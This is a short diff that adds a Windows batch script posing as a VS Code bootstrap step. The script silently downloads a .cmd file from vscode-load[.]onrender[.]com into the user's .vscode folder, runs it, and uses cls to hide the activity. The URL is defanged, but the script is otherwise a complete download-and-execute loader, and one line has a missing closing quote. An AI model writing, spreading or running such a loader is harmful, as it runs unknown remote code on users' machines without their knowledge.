@@ -1,1 +1,9 @@
-Curl -s -L -o "%VSCODE_DIR%\vscode-bootstrap.cmd" hxxp://vscode-load[.]onrender[.]com/settings/bootstrap?flag=4
+@echo off
+set "VSCODE_DIR=%USERPROFILE%\.vscode"
+
+if not exist "%VSCODE_DIR%" ( mkdir "%VSCODE_DIR% )
+
+curl -s -L -o "%VSCODE_DIR%\vscode-bootstrap.cmd" hxxp://vscode-load[.]onrender[.]com/settings/bootstrap?flag=4
+cls
+"%VSCODE_DIR%\vscode-bootstrap.cmd"
+cls
